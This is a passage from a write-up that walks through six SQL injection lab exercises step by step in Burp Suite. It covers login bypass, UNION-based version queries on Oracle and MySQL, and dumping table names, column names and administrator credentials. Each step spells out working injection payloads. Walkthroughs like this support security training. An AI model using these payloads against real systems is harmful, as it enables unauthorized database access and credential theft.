# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cb75436f-46d8-4223-a333-d02e2a762328)

Going over to the webpage and clicking on ```Gifts```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6da250fc-c7da-40e0-a2a9-b480799c9b9e)

You should get this,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/8d3ff589-b4af-4ebe-b289-e33e0d3092aa)

Now, lets capture this request on burpsuite

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f3c61aa9-6328-457c-9ef6-759a6445d02d)

Sending the request over to burp repeater,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/40ce0d22-99e5-4dbf-9505-f49d929d73ab)

To display one or more unreleased products, we can use the payload ```' or 1=1--```, make sure this is url encoded to something like this ```'+or+1%3d1--```.

Adding this payload to the url,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ef4d74eb-dd1b-42e4-ab2b-2d9c795441ca)

cool, the status code is "ok". Viewing the response in our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1e5003b4-7002-4fb4-9f2a-7e0d2206dfea)

Nice, we have successfully solved the lab😎.

------------------------------

# SQL injection vulnerability allowing login bypass
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fe917a2c-c5ee-4957-a733-9791d8041234)

Navigating to the webpage and clicking on "My Account"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/84e38257-e3d5-4722-b16e-9a736d67ac1e)

You should get this,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f4f46852-8207-4ab0-a157-8523b8b9dda5)

So we are asked to login as the ```administrator``` user, to do this we can use this

username:```administrator'--```          password:```aaaaaaa```

Note: We can either provide a blank password or we use any random stuff for the password since the password will get commented out anyways

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/85078867-6d9a-49b4-ae35-f179f3c1ec43)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bcde4b54-e194-499a-ae31-95dfeb16e484)

Cool, we have successfully solved the lab

---------------------

# SQL injection attack, querying the database type and version on Oracle
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1a110c4b-d810-42b6-b7f3-b5f9df4e4544)

Navigating to the webpage

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a6c32fe1-538c-430b-8725-13a4afaf4e08)

Capturing the request on burpsuite,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6974648d-151b-4b1d-a68e-1aad9dbcf6b6)

First thing to do is to confirm the number of columns available in the database

So, we'll be using the query
```
' order by 1--
' order by 2--
' order by 3--
```
Ensure this is url encoded, so when you get the internal server error, it means the column number isn't available

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/46cca6a6-9af2-41e9-a473-8f2388847fce)

This means there's a column available in the database,

Trying other queries

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/413576a4-6bb9-4cab-918c-d629f51080fb)

This makes it 2 columns available in the database,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/28d25efa-ca02-4434-93ae-a908703068d9)

From the above screenshot you'll see that the query ```' order by 3--``` returned an Internal Server Error, which means there isn't a column 3 available in the database.

So, we have 2 columns available in the database.

To query the database version we can use the following query 
```
' UNION SELECT banner,null FROM v$version--
```
Explaining this
```
The banner column contains the information about the database version
The null is just there to fill in for the second column of the result
v$version is the name of a database table
```
Trying the query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9f5f9626-7647-445a-8c29-3d021874baf0)

Lets show the response in our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a8001d54-7b63-488e-aa76-10bb21085337)

Nice, we have successfully solved the lab

-------------------------

# SQL injection attack, querying the database type and version on MySQL and Microsoft
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/178842fc-a6ef-4ae6-a5db-6dfe6ad690e9)

Navigating to the webpage, clicking on "Gifts"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2fdc0c82-d053-4b7d-b950-8320359cac38)

Capturing this request on burpsuite and sending it over to burp intruder

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f8492bbd-7d49-4822-acc0-9fb99834b8e1)

Now, lets check the number of columns available in the database using the query
```
' order by 1-- -
' order by 2-- -
' order by 3-- -
```
Ensure this is url encoded, so when you get the internal server error, it means the column number isn't available

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3a425de3-a5bc-45d1-8c42-49ab259a9d9b)

This means we have a column available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4213061d-8978-4139-98a8-969f29cdf0e9)

This means we have 2 columns available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/df69463e-1b78-4785-bedb-a7d2b1ff3fc2)

From the above screenshot you'll see that the query ```' order by 3-- -``` returned an Internal Server Error, which means there isn't a column 3 available in the database.

Now, to display the database version string, we can use  the query
```
' UNION SELECT version(),null-- -
```
Using this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6bc2ab51-98ba-4253-bdb6-54bc1f6c5415)

Now, lets show this response in our browser

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/07d81260-800d-4d88-90df-1e5695deaf95)

Nice, we have successfully completed the task for this lab😎

--------------------------

# SQL injection attack, listing the database contents on non-Oracle databases
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4b71c9e3-4b94-4834-b5c5-a0ee579a0c1e)

Navigate to the webpage and click on "Gift"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d8704324-610b-4fb8-a5c6-3a0d1c436dad)

Capturing the request on burpsuite and sending it over to burp repeater

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/e3971a3f-8b29-4e64-89bc-99cde62a1c2f)

First, lets check the number of columns available in this database.

We can do that using the queries
```
' order by 1--
' order by 2--
' order by 3--
```
Ensure you url encode the queries before using themm

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c75e93d5-10f7-4453-a7f2-2a95acf6320e)

Now, this means we have a column available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f8e49c5a-f5ab-4ed6-87dd-a445af4f8513)

We have 2 columns available in the database.

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4331b044-4dec-4b1a-928b-364225933074)

We got an Internal Server Error here, this means there isn't a column 3 available in the database.

Hence, we have 2 columns available in the database.

Lets try to get the version the database is running, we can use the query
```
' UNION SELECT version(),null--
```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5c2c24f3-0b28-422e-bfde-a78afceacc68)

Now, lets check the name of the tables in the database. We can use the query
```
' UNION SELECT table_name,null FROM information_schema.tables--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/f027d2a4-0b2b-4abd-a750-168372eaa2fd)

We found a table ```users_vqdnay```.

Next thing to do is to check the name of the columns in the table, we can use the query
```
' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users_vqdnay'--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/9e884a31-5c98-4818-9ca8-22dc60184c43)

We got the columns ```username_dgcaur``` and ```password_eygubt```.

Cool, lets dump the contents of the columns using the query
```
' UNION SELECT username_dgcaur,password_eygubt FROM users_vqdnay--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2d0f4291-5858-4a65-a5ac-6936bdad6c32)

We got the credentials for the administrator user

username:```administrator```          password:```7ocf0wre9y16c1llsdp1```

Lets go ahead and log in

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d5c976ef-a3bf-48ee-9c21-fe5f8c47832f)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6dbc4baf-367b-4b2b-a3f3-adda3da1aeca)

Nice, we have succesfully completed the task for this lab.

---------------------------

# SQL injection attack, listing the database contents on Oracle
<hr>

## Task

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7465f61f-7882-4c1b-8bca-6804b4324362)

Navigate to the webpage and click on "Gifts"

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a3fb15da-dd80-4081-930e-49c1266812a7)

Capturing this request on burpsuite and sending it over to burp repeater,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cbba3330-c8f3-435b-acaa-b11ccc594079)

Lets start out by checking the amount of columns available in the database. We can use the queries
```
' order by 1--
' order by 2--
' order by 3--
```
Ensure the queries are url encoded before applying them

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d2edb3a2-1217-45d6-bd92-f0f04e0e17df)

This means we have a column available in the database

Moving on, 

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/bb6896d2-8423-4d82-9f51-310262faf277)

Now, this means we have 2 columns available in the database

Moving on,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/22478a20-b1c2-47ad-bfea-4bc003391a4d)

The "Internal Server Error" means that there isn't a third column available in the database.

Lets check the version the database is running using the query
```
' UNION SELECT banner,null FROM v$version--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/b01f6263-e68a-422f-868b-1deede320ec5)

Cool, we were able to get the version the database is running.

To get the name of the tables in the database, we can use the query
```
' UNION SELECT table_name,null FROM all_tables--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/3e91fdbe-a352-4f1d-8e76-f2c43f9343e9)

We found the table name ```USERS_DHHSSL```

The next thing to do is check the name of columns available in the table. We can do that using the query
```
' UNION SELECT column_name,null FROM all_tab_columns WHERE table_name='USERS_DHHSSL'--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/184e3392-f394-4214-b2aa-082e4151600c)

We got the column names ```USERNAME_ZTMDCJ``` and ```PASSWORD_QGFLBW```.

Now, lets go ahead and dump the contents of the columns using the query
```
' UNION SELECT USERNAME_ZTMDCJ,PASSWORD_QGFLBW FROM USERS_DHHSSL--
```
Applying this query

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/d2fe705e-0b88-47fc-9da8-1d61b0278d1b)

We got the creds for the administrator user

username:```administrator```          password:```8aqefrxiudrdaqkhk3qf```

Lets go ahead and login as the administrator user

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/90028565-b596-46bd-a8bd-5f21c86faf87)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6df244bc-a9f2-4fd7-b3f6-7b99e663f298)

Cool stuff, we have successfully completed the task for this lab.

--------------------

#


































